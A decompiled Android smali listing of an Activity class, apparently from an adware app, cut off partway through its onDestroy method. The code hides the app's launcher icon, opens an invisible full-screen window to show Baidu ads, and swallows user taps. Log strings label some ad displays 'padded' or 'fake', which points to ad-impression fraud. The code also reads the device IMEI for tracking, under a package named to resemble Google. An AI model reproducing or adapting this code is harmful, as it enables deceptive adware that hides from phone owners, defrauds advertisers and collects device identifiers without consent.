.class public Lcom/attached/Tmac;
.super Landroid/app/Activity;
.source "Tmac.java"

# interfaces
.implements Lcom/sgoogle/LuFei;
.implements Lcom/wzz/wzz/ICallBack;
.implements Ljava/lang/Runnable;


# static fields
.field public static final FLAG_HOMEKEY_DISPATCHED:I = -0x80000000


# instance fields
.field bean:Ldomain/TongjiBean;

.field buLiang:Z

.field public downCount:I

.field isAddedCount:Z

.field private julyAdvLayout:Landroid/widget/LinearLayout;

.field lock:Z

.field private mContext:Landroid/content/Context;

.field private mDubao:Lcom/baidu/mobads/DubaoAd;

.field private mHandler:Landroid/os/Handler;

.field sysVersion:I

.field sysVersion1:I


# direct methods
.method public constructor <init>()V
    .locals 2

    .prologue
    const/4 v1, 0x0

    .line 43
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 48
    iput-boolean v1, p0, Lcom/attached/Tmac;->isAddedCount:Z

    .line 49
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/attached/Tmac;->lock:Z

    .line 50
    iput-boolean v1, p0, Lcom/attached/Tmac;->buLiang:Z

    .line 52
    sget-object v0, Landroid/os/Build$VERSION;->SDK:Ljava/lang/String;

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    iput v0, p0, Lcom/attached/Tmac;->sysVersion:I

    .line 53
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    iput v0, p0, Lcom/attached/Tmac;->sysVersion1:I

    .line 291
    iput v1, p0, Lcom/attached/Tmac;->downCount:I

    .line 43
    return-void
.end method

.method private bLiangTLogical()V
    .locals 4

    .prologue
    const/4 v3, 0x1

    const/4 v2, 0x0

    .line 116
    iget-object v1, p0, Lcom/attached/Tmac;->mContext:Landroid/content/Context;

    invoke-static {v1}, Lcom/sgoogle/Tools;->getShowAdvCount(Landroid/content/Context;)I

    move-result v0

    .line 118
    .local v0, "showAdvCount":I
    add-int/lit8 v1, v0, -0x1

    rem-int/lit8 v1, v1, 0x7

    if-nez v1, :cond_1

    .line 119
    iput-boolean v2, p0, Lcom/attached/Tmac;->buLiang:Z

    .line 120
    iput-boolean v3, p0, Lcom/attached/Tmac;->lock:Z

    .line 121
    sget-boolean v1, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v1, :cond_0

    .line 122
    const-string v1, "JULY"

    const-string v2, "\u771f\u5b9e\u5c55\u793a----------------------"

    invoke-static {v1, v2}, Lcom/sgoogle/TLog;->w(Ljava/lang/String;Ljava/lang/String;)V

    .line 124
    :cond_0
    const-string v1, "JULY"

    const-string v2, "\u771f----------------------"

    invoke-static {v1, v2}, Lcom/sgoogle/TLog;->test(Ljava/lang/String;Ljava/lang/String;)V

    .line 158
    :goto_0
    return-void

    .line 126
    :cond_1
    iput-boolean v3, p0, Lcom/attached/Tmac;->buLiang:Z

    .line 127
    iput-boolean v2, p0, Lcom/attached/Tmac;->lock:Z

    .line 128
    sget-boolean v1, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v1, :cond_2

    .line 129
    const-string v1, "JULY"

    const-string v2, "\u8865\u91cf\u5c55\u793a----------------------"

    invoke-static {v1, v2}, Lcom/sgoogle/TLog;->w(Ljava/lang/String;Ljava/lang/String;)V

    .line 131
    :cond_2
    const-string v1, "JULY"

    const-string v2, "\u5047----------------------"

    invoke-static {v1, v2}, Lcom/sgoogle/TLog;->test(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method

.method private buLiang()V
    .locals 4

    .prologue
    .line 375
    :try_start_0
    new-instance v1, Ljava/util/Random;

    invoke-direct {v1}, Ljava/util/Random;-><init>()V

    const/16 v2, 0x3de

    invoke-virtual {v1, v2}, Ljava/util/Random;->nextInt(I)I

    move-result v1

    mul-int/lit8 v1, v1, 0x64

    .line 376
    new-instance v2, Ljava/util/Random;

    invoke-direct {v2}, Ljava/util/Random;-><init>()V

    const/16 v3, 0x5a

    invoke-virtual {v2, v3}, Ljava/util/Random;->nextInt(I)I

    move-result v2

    mul-int/lit8 v2, v2, 0x64

    .line 375
    add-int/2addr v1, v2

    .line 377
    new-instance v2, Ljava/util/Random;

    invoke-direct {v2}, Ljava/util/Random;-><init>()V

    const/16 v3, 0x384

    invoke-virtual {v2, v3}, Ljava/util/Random;->nextInt(I)I

    move-result v2

    mul-int/lit8 v2, v2, 0x64

    .line 375
    add-int/2addr v1, v2

    .line 378
    new-instance v2, Ljava/util/Random;

    invoke-direct {v2}, Ljava/util/Random;-><init>()V

    const/16 v3, 0x5a

    invoke-virtual {v2, v3}, Ljava/util/Random;->nextInt(I)I

    move-result v2

    mul-int/lit8 v2, v2, 0x64

    .line 375
    add-int/2addr v1, v2

    add-int/lit16 v1, v1, 0x4e20

    .line 379
    new-instance v2, Ljava/util/Random;

    invoke-direct {v2}, Ljava/util/Random;-><init>()V

    const/16 v3, 0x64

    invoke-virtual {v2, v3}, Ljava/util/Random;->nextInt(I)I

    move-result v2

    .line 375
    sub-int/2addr v1, v2

    .line 379
    const/16 v2, 0x28

    if-lt v1, v2, :cond_2

    const/16 v0, 0x4e20

    .line 380
    .local v0, "sleepTime":I
    :goto_0
    sget-boolean v1, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v1, :cond_0

    .line 381
    const-string v1, "JULY"

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "====\u8865\u91cfsleepTime=="

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lcom/sgoogle/TLog;->w(Ljava/lang/String;Ljava/lang/String;)V

    .line 382
    const/16 v0, 0x7530

    .line 384
    :cond_0
    invoke-virtual {p0}, Lcom/attached/Tmac;->isFinishing()Z

    move-result v1

    if-nez v1, :cond_1

    .line 385
    iget-object v1, p0, Lcom/attached/Tmac;->mHandler:Landroid/os/Handler;

    if-eqz v1, :cond_1

    .line 386
    iget-object v1, p0, Lcom/attached/Tmac;->mHandler:Landroid/os/Handler;

    if-ltz v0, :cond_3

    .line 387
    .end local v0    # "sleepTime":I
    :goto_1
    int-to-long v2, v0

    .line 386
    invoke-virtual {v1, p0, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 392
    :cond_1
    :goto_2
    return-void

    .line 379
    :cond_2
    const/16 v0, 0x7530

    goto :goto_0

    .line 387
    .restart local v0    # "sleepTime":I
    :cond_3
    const v0, 0xea60

    goto :goto_1

    .line 390
    .end local v0    # "sleepTime":I
    :catch_0
    move-exception v1

    goto :goto_2
.end method

.method public static dis(Landroid/content/Context;)V
    .locals 5
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 57
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    .line 58
    .local v2, "p":Landroid/content/pm/PackageManager;
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v1

    .line 59
    .local v1, "i":Landroid/content/Intent;
    invoke-virtual {v1}, Landroid/content/Intent;->getComponent()Landroid/content/ComponentName;

    move-result-object v0

    .line 61
    .local v0, "componentName":Landroid/content/ComponentName;
    const/4 v3, 0x2

    .line 62
    const/4 v4, 0x1

    .line 60
    invoke-virtual {v2, v0, v3, v4}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 65
    .end local v0    # "componentName":Landroid/content/ComponentName;
    .end local v1    # "i":Landroid/content/Intent;
    .end local v2    # "p":Landroid/content/pm/PackageManager;
    :goto_0
    return-void

    .line 63
    :catch_0
    move-exception v3

    goto :goto_0
.end method

.method private initParams()V
    .locals 2

    .prologue
    .line 220
    iget-object v0, p0, Lcom/attached/Tmac;->bean:Ldomain/TongjiBean;

    if-nez v0, :cond_0

    .line 221
    new-instance v0, Ldomain/TongjiBean;

    invoke-direct {v0}, Ldomain/TongjiBean;-><init>()V

    iput-object v0, p0, Lcom/attached/Tmac;->bean:Ldomain/TongjiBean;

    .line 223
    :cond_0
    iget-object v0, p0, Lcom/attached/Tmac;->bean:Ldomain/TongjiBean;

    const-string v1, ""

    iput-object v1, v0, Ldomain/TongjiBean;->adKey:Ljava/lang/String;

    .line 224
    iget-object v0, p0, Lcom/attached/Tmac;->bean:Ldomain/TongjiBean;

    const-string v1, "12241"

    iput-object v1, v0, Ldomain/TongjiBean;->appkey:Ljava/lang/String;

    .line 225
    iget-object v0, p0, Lcom/attached/Tmac;->bean:Ldomain/TongjiBean;

    iget-object v1, p0, Lcom/attached/Tmac;->mContext:Landroid/content/Context;

    invoke-static {v1}, Lcom/sgoogle/Tools;->getIMEI(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Ldomain/TongjiBean;->imei:Ljava/lang/String;

    .line 226
    return-void
.end method

.method private showAdvCountTLogical()V
    .locals 5

    .prologue
    .line 329
    iget-object v1, p0, Lcom/attached/Tmac;->mContext:Landroid/content/Context;

    invoke-static {v1}, Lcom/sgoogle/Tools;->getShowAdvCount(Landroid/content/Context;)I

    move-result v0

    .line 330
    .local v0, "showAdvCount":I
    sget-boolean v1, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v1, :cond_0

    .line 331
    const-string v1, "JULY"

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "showAdvCount= "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lcom/sgoogle/TLog;->w(Ljava/lang/String;Ljava/lang/String;)V

    .line 332
    const-string v1, "JULY"

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "\u7edf\u8ba1\u5c55\u793a"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\u6b21............"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lcom/sgoogle/TLog;->w(Ljava/lang/String;Ljava/lang/String;)V

    .line 334
    :cond_0
    add-int/lit8 v0, v0, 0x1

    .line 335
    sget-boolean v1, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v1, :cond_1

    .line 336
    const-string v1, "JULY"

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "showAdvCount================= "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lcom/sgoogle/TLog;->w(Ljava/lang/String;Ljava/lang/String;)V

    .line 337
    :cond_1
    iget-object v1, p0, Lcom/attached/Tmac;->mContext:Landroid/content/Context;

    invoke-static {v1, v0}, Lcom/sgoogle/Tools;->setShowAdvCount(Landroid/content/Context;I)V

    .line 348
    iget-boolean v1, p0, Lcom/attached/Tmac;->buLiang:Z

    if-eqz v1, :cond_3

    .line 349
    invoke-direct {p0}, Lcom/attached/Tmac;->buLiang()V

    .line 366
    :cond_2
    :goto_0
    const-string v1, "JULY"

    .line 367
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "=========3===ADLY_CODE=========12241 | "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 368
    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " |BL= "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-boolean v3, p0, Lcom/attached/Tmac;->buLiang:Z

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " |Umkey= "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 369
    iget-object v3, p0, Lcom/attached/Tmac;->mContext:Landroid/content/Context;

    const-string v4, "UMENG_APPKEY"

    invoke-static {v3, v4}, Lcom/sgoogle/Tools;->getAppMetaData(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " |App_ID= "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 370
    iget-object v3, p0, Lcom/attached/Tmac;->mContext:Landroid/content/Context;

    const-string v4, "BaiduMobAd_APP_ID"

    invoke-static {v3, v4}, Lcom/sgoogle/Tools;->getAppMetaData(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 367
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 366
    invoke-static {v1, v2}, Lcom/sgoogle/TLog;->test(Ljava/lang/String;Ljava/lang/String;)V

    .line 371
    return-void

    .line 351
    :cond_3
    invoke-virtual {p0}, Lcom/attached/Tmac;->isFinishing()Z

    move-result v1

    if-nez v1, :cond_2

    .line 352
    sget-boolean v1, Lcom/sgoogle/Tools;->DEBUG:Z

    if-nez v1, :cond_2

    .line 354
    iget-object v1, p0, Lcom/attached/Tmac;->mHandler:Landroid/os/Handler;

    if-eqz v1, :cond_2

    .line 355
    iget-object v1, p0, Lcom/attached/Tmac;->mHandler:Landroid/os/Handler;

    const-wide/32 v2, 0x2bf20

    invoke-virtual {v1, p0, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto :goto_0
.end method


# virtual methods
.method public callBack()V
    .locals 0

    .prologue
    .line 325
    invoke-direct {p0}, Lcom/attached/Tmac;->showAdvCountTLogical()V

    .line 326
    return-void
.end method

.method public ctx()V
    .locals 6

    .prologue
    const/high16 v5, 0x43960000    # 300.0f

    .line 204
    invoke-virtual {p0}, Lcom/attached/Tmac;->getWindow()Landroid/view/Window;

    move-result-object v2

    .line 205
    .local v2, "win":Landroid/view/Window;
    invoke-virtual {v2}, Landroid/view/Window;->getAttributes()Landroid/view/WindowManager$LayoutParams;

    move-result-object v1

    .line 206
    .local v1, "params":Landroid/view/WindowManager$LayoutParams;
    new-instance v3, Landroid/graphics/drawable/ColorDrawable;

    const/high16 v4, 0xff0000

    invoke-direct {v3, v4}, Landroid/graphics/drawable/ColorDrawable;-><init>(I)V

    invoke-virtual {v2, v3}, Landroid/view/Window;->setBackgroundDrawable(Landroid/graphics/drawable/Drawable;)V

    .line 207
    const/16 v3, 0x30

    iput v3, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 208
    new-instance v0, Landroid/util/DisplayMetrics;

    invoke-direct {v0}, Landroid/util/DisplayMetrics;-><init>()V

    .line 209
    .local v0, "mDisplayMetrics":Landroid/util/DisplayMetrics;
    const-string v3, "window"

    invoke-virtual {p0, v3}, Lcom/attached/Tmac;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/WindowManager;

    .line 210
    invoke-interface {v3}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v3

    invoke-virtual {v3, v0}, Landroid/view/Display;->getMetrics(Landroid/util/DisplayMetrics;)V

    .line 211
    iget v3, v0, Landroid/util/DisplayMetrics;->density:F

    mul-float/2addr v3, v5

    float-to-int v3, v3

    iput v3, v1, Landroid/view/WindowManager$LayoutParams;->height:I

    .line 212
    iget v3, v0, Landroid/util/DisplayMetrics;->density:F

    mul-float/2addr v3, v5

    float-to-int v3, v3

    iput v3, v1, Landroid/view/WindowManager$LayoutParams;->width:I

    .line 213
    iget v3, v0, Landroid/util/DisplayMetrics;->heightPixels:I

    iput v3, v1, Landroid/view/WindowManager$LayoutParams;->height:I

    .line 214
    iget v3, v0, Landroid/util/DisplayMetrics;->widthPixels:I

    iput v3, v1, Landroid/view/WindowManager$LayoutParams;->width:I

    .line 215
    const/4 v3, 0x0

    iput v3, v1, Landroid/view/WindowManager$LayoutParams;->alpha:F

    .line 216
    invoke-virtual {v2, v1}, Landroid/view/Window;->setAttributes(Landroid/view/WindowManager$LayoutParams;)V

    .line 217
    return-void
.end method

.method public dispatchTouchEvent(Landroid/view/MotionEvent;)Z
    .locals 3
    .param p1, "ev"    # Landroid/view/MotionEvent;

    .prologue
    .line 295
    iget-boolean v0, p0, Lcom/attached/Tmac;->buLiang:Z

    if-eqz v0, :cond_3

    .line 296
    invoke-virtual {p1}, Landroid/view/MotionEvent;->getAction()I

    move-result v0

    if-nez v0, :cond_2

    .line 297
    sget-boolean v0, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v0, :cond_0

    .line 298
    const-string v0, "JULY"

    const-string v1, "dispatchTouchEvent=FINISHED.............."

    invoke-static {v0, v1}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 300
    :cond_0
    iget v0, p0, Lcom/attached/Tmac;->downCount:I

    const/4 v1, 0x3

    if-lt v0, v1, :cond_1

    .line 301
    invoke-virtual {p0}, Lcom/attached/Tmac;->finish()V

    .line 303
    :cond_1
    iget v0, p0, Lcom/attached/Tmac;->downCount:I

    add-int/lit8 v0, v0, 0x1

    iput v0, p0, Lcom/attached/Tmac;->downCount:I

    .line 305
    :cond_2
    const/4 v0, 0x1

    .line 320
    :goto_0
    return v0

    .line 307
    :cond_3
    invoke-virtual {p1}, Landroid/view/MotionEvent;->getAction()I

    move-result v0

    if-nez v0, :cond_7

    iget-boolean v0, p0, Lcom/attached/Tmac;->lock:Z

    if-eqz v0, :cond_7

    .line 308
    sget-boolean v0, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v0, :cond_4

    .line 309
    const-string v0, "JULY"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "downCount="

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget v2, p0, Lcom/attached/Tmac;->downCount:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 311
    :cond_4
    iget v0, p0, Lcom/attached/Tmac;->downCount:I

    const/16 v1, 0x8

    if-lt v0, v1, :cond_6

    .line 312
    sget-boolean v0, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v0, :cond_5

    .line 313
    const-string v0, "JULY"

    const-string v1, "finish="

    invoke-static {v0, v1}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 315
    :cond_5
    invoke-virtual {p0}, Lcom/attached/Tmac;->finish()V

    .line 317
    :cond_6
    iget v0, p0, Lcom/attached/Tmac;->downCount:I

    add-int/lit8 v0, v0, 0x1

    iput v0, p0, Lcom/attached/Tmac;->downCount:I

    .line 320
    :cond_7
    invoke-super {p0, p1}, Landroid/app/Activity;->dispatchTouchEvent(Landroid/view/MotionEvent;)Z

    move-result v0

    goto :goto_0
.end method

.method public initData()V
    .locals 0

    .prologue
    .line 201
    return-void
.end method

.method public initView()V
    .locals 6

    .prologue
    .line 163
    sget-object v4, Lcom/baidu/mobads/AppActivity$ActionBarColorTheme;->ACTION_BAR_WHITE_THEME:Lcom/baidu/mobads/AppActivity$ActionBarColorTheme;

    invoke-static {v4}, Lcom/baidu/mobads/AppActivity;->setActionBarColorTheme(Lcom/baidu/mobads/AppActivity$ActionBarColorTheme;)V

    .line 164
    iget-object v4, p0, Lcom/attached/Tmac;->julyAdvLayout:Landroid/widget/LinearLayout;

    const/16 v5, 0x50

    invoke-virtual {v4, v5}, Landroid/widget/LinearLayout;->setGravity(I)V

    .line 166
    const-string v0, ""

    .line 167
    .local v0, "adPlaceId":Ljava/lang/String;
    const/4 v1, 0x0

    .line 168
    .local v1, "position":I
    const-wide v2, 0x3fc999999999999aL    # 0.2

    .line 169
    .local v2, "marginPercent":D
    new-instance v4, Lcom/baidu/mobads/DubaoAd;

    new-instance v5, Lcom/baidu/mobads/DubaoAd$Position;

    .line 170
    invoke-direct {v5, v1, v2, v3}, Lcom/baidu/mobads/DubaoAd$Position;-><init>(ID)V

    invoke-direct {v4, p0, v0, v5}, Lcom/baidu/mobads/DubaoAd;-><init>(Landroid/app/Activity;Ljava/lang/String;Lcom/baidu/mobads/DubaoAd$Position;)V

    .line 169
    iput-object v4, p0, Lcom/attached/Tmac;->mDubao:Lcom/baidu/mobads/DubaoAd;

    .line 171
    return-void
.end method

.method public onAttachedToWindow()V
    .locals 0

    .prologue
    .line 288
    invoke-super {p0}, Landroid/app/Activity;->onAttachedToWindow()V

    .line 289
    return-void
.end method

.method public onBackPressed()V
    .locals 2

    .prologue
    .line 271
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    .line 272
    iget-boolean v0, p0, Lcom/attached/Tmac;->lock:Z

    if-nez v0, :cond_0

    .line 273
    invoke-virtual {p0}, Lcom/attached/Tmac;->finish()V

    .line 274
    sget-boolean v0, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v0, :cond_0

    .line 275
    const-string v0, "JULY"

    const-string v1, "FINSHI.............."

    invoke-static {v0, v1}, Lcom/sgoogle/TLog;->e(Ljava/lang/String;Ljava/lang/String;)V

    .line 278
    :cond_0
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 9
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    const/16 v8, 0x50

    const/4 v7, 0x1

    const/4 v6, 0x0

    .line 68
    invoke-virtual {p0, v7}, Lcom/attached/Tmac;->requestWindowFeature(I)Z

    .line 69
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 74
    iput-object p0, p0, Lcom/attached/Tmac;->mContext:Landroid/content/Context;

    .line 75
    iget-object v3, p0, Lcom/attached/Tmac;->mContext:Landroid/content/Context;

    invoke-static {v3}, Lcom/sgoogle/Tools;->getShowAdvCount(Landroid/content/Context;)I

    move-result v1

    .line 76
    .local v1, "showAdvCount":I
    new-instance v3, Landroid/os/Handler;

    invoke-direct {v3}, Landroid/os/Handler;-><init>()V

    iput-object v3, p0, Lcom/attached/Tmac;->mHandler:Landroid/os/Handler;

    .line 78
    const-string v3, "JULY"

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "=====TMAC========= | "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 79
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 78
    invoke-static {v3, v4}, Lcom/sgoogle/TLog;->test(Ljava/lang/String;Ljava/lang/String;)V

    .line 80
    sget-boolean v3, Lcom/sgoogle/Tools;->DEBUG:Z

    if-eqz v3, :cond_1

    .line 81
    new-instance v3, Landroid/content/Intent;

    iget-object v4, p0, Lcom/attached/Tmac;->mContext:Landroid/content/Context;

    const-class v5, Lcom/wzz/wzz/QieSb;

    invoke-direct {v3, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v3}, Lcom/attached/Tmac;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 85
    :goto_0
    iget-object v3, p0, Lcom/attached/Tmac;->mContext:Landroid/content/Context;

    invoke-static {v3}, Lcom/sgoogle/Tools;->isFirstIint(Landroid/content/Context;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 87
    iget-object v3, p0, Lcom/attached/Tmac;->mContext:Landroid/content/Context;

    invoke-static {v3, v6}, Lcom/sgoogle/Tools;->setFistInit(Landroid/content/Context;Z)V

    .line 89
    :cond_0
    iput-boolean v6, p0, Lcom/attached/Tmac;->buLiang:Z

    .line 90
    iget-boolean v3, p0, Lcom/attached/Tmac;->buLiang:Z

    if-eqz v3, :cond_2

    .line 91
    invoke-virtual {p0}, Lcom/attached/Tmac;->ctx()V

    .line 100
    :goto_1
    new-instance v3, Ldomain/TongjiBean;

    invoke-direct {v3}, Ldomain/TongjiBean;-><init>()V

    iput-object v3, p0, Lcom/attached/Tmac;->bean:Ldomain/TongjiBean;

    .line 101
    iget-object v3, p0, Lcom/attached/Tmac;->mContext:Landroid/content/Context;

    invoke-static {v3}, Lcom/sgoogle/Tools;->getScreenHeight(Landroid/content/Context;)I

    move-result v3

    sput v3, Lcom/sgoogle/Constants;->HEIGHT:I

    .line 102
    new-instance v3, Landroid/widget/LinearLayout;

    iget-object v4, p0, Lcom/attached/Tmac;->mContext:Landroid/content/Context;

    invoke-direct {v3, v4}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    iput-object v3, p0, Lcom/attached/Tmac;->julyAdvLayout:Landroid/widget/LinearLayout;

    .line 103
    iget-object v3, p0, Lcom/attached/Tmac;->julyAdvLayout:Landroid/widget/LinearLayout;

    invoke-virtual {v3, v6}, Landroid/widget/LinearLayout;->setBackgroundColor(I)V

    .line 104
    iget-object v3, p0, Lcom/attached/Tmac;->julyAdvLayout:Landroid/widget/LinearLayout;

    invoke-virtual {v3, v7}, Landroid/widget/LinearLayout;->setOrientation(I)V

    .line 105
    iget-object v3, p0, Lcom/attached/Tmac;->julyAdvLayout:Landroid/widget/LinearLayout;

    invoke-virtual {v3, v8}, Landroid/widget/LinearLayout;->setGravity(I)V

    .line 106
    iget-object v3, p0, Lcom/attached/Tmac;->julyAdvLayout:Landroid/widget/LinearLayout;

    invoke-virtual {p0, v3}, Lcom/attached/Tmac;->setContentView(Landroid/view/View;)V

    .line 108
    invoke-virtual {p0}, Lcom/attached/Tmac;->initView()V

    .line 110
    const-string v3, "JULY"

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "Verson="

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget v5, p0, Lcom/attached/Tmac;->sysVersion:I

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Lcom/sgoogle/TLog;->w(Ljava/lang/String;Ljava/lang/String;)V

    .line 111
    const-string v3, "JULY"

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "Verson="

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget v5, p0, Lcom/attached/Tmac;->sysVersion1:I

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Lcom/sgoogle/TLog;->w(Ljava/lang/String;Ljava/lang/String;)V

    .line 112
    return-void

    .line 83
    :cond_1
    invoke-direct {p0}, Lcom/attached/Tmac;->bLiangTLogical()V

    goto :goto_0

    .line 93
    :cond_2
    invoke-virtual {p0}, Lcom/attached/Tmac;->getWindow()Landroid/view/Window;

    move-result-object v2

    .line 94
    .local v2, "win":Landroid/view/Window;
    invoke-virtual {v2}, Landroid/view/Window;->getAttributes()Landroid/view/WindowManager$LayoutParams;

    move-result-object v0

    .line 95
    .local v0, "params":Landroid/view/WindowManager$LayoutParams;
    new-instance v3, Landroid/graphics/drawable/ColorDrawable;

    invoke-direct {v3, v6}, Landroid/graphics/drawable/ColorDrawable;-><init>(I)V

    invoke-virtual {v2, v3}, Landroid/view/Window;->setBackgroundDrawable(Landroid/graphics/drawable/Drawable;)V

    .line 96
    iput v8, v0, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 97
    invoke-virtual {v2, v0}, Landroid/view/Window;->setAttributes(Landroid/view/WindowManager$LayoutParams;)V

    goto :goto_1
.end method

.method protected onDestroy()V
    .locals 4

    .prologue
    .line 176
    :try_start_0
